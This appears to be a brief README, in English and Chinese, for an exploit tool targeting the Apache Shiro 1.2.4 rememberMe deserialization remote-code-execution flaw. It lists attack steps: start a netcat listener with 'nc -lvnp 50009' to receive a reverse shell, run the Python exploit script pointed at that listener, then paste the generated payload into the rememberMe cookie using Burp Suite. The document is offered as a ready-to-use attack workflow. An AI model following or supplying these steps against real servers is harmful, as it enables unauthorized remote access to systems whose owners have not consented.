# Apache_Shiro_1.2.4_RCE
Apache shiro &lt;= 1.2.4  rememberMe 反序列化漏洞利用工具
nc -lvnp 50009
python shiro_1.2.4.py ip:50009
burpsuite  替换 Cookie: rememberMe=
